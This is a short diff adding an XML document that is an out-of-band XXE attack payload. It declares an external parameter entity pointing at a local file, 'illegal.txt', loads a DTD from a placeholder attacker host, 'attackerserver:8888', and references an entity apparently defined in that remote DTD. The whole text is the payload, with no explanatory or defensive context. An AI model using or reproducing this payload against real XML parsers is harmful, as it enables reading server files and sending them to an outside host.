@@ -1,0 +1,6 @@
+<!DOCTYPE Company [
+<!ENTITY % content SYSTEM "illegal.txt">
+<!ENTITY % dtd SYSTEM 'http://attackerserver:8888/readillegal.dtd'>
+%dtd;
+]>
+<Company> &filecontent; </Company>
